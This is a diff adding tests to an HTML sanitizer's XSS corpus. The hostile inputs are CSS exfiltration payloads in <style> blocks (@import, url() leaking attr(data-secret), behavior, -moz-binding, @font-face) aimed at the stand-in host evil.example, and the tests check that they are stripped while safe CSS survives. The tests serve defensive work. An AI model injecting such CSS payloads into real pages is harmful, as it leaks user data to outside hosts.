@@ -58,6 +58,33 @@ describe("sanitize_html — XSS corpus", () => {
 		expect(output).toContain("<strong>bold</strong>");
 		expect(output).toContain("<em>italic</em>");
 	});
+
+	test("neutralizes CSS exfil vectors inside <style> blocks (A4 verifier finding)", () => {
+		const hostile = [
+			`<style>@import url("https://evil.example/beacon.css");</style>`,
+			`<style>body { background: url('https://evil.example/beacon.png?leak='attr(data-secret)); }</style>`,
+			`<style>.x { behavior: url(https://evil.example/x.htc); }</style>`,
+			`<style>.y { -moz-binding: url("https://evil.example/xbl.xml#x"); }</style>`,
+			`<style>@font-face { font-family: x; src: url(https://evil.example/font.woff); }</style>`,
+		].join("\n");
+
+		const output = sanitize_html(hostile);
+
+		expect(output).not.toContain("evil.example");
+		expect(output).not.toContain("@import");
+		// The style tag itself and non-exfil declarations survive — this is a
+		// filter, not a strip: `<style>` stays usable for real layout/color CSS.
+		expect(output).toContain("<style>");
+	});
+
+	test("preserves safe, non-exfil CSS inside a style block that also carries a hostile url()", () => {
+		const mixed = `<style>.foo { color: red; } .bar { background: url(https://evil.example/x.png); } .baz { font-weight: bold; }</style>`;
+		const output = sanitize_html(mixed);
+
+		expect(output).toContain(".foo { color: red; }");
+		expect(output).toContain(".baz { font-weight: bold; }");
+		expect(output).not.toContain("evil.example");
+	});
 });
 
 describe("sanitize_text — plain-text escape for thread entry bodies", () => {
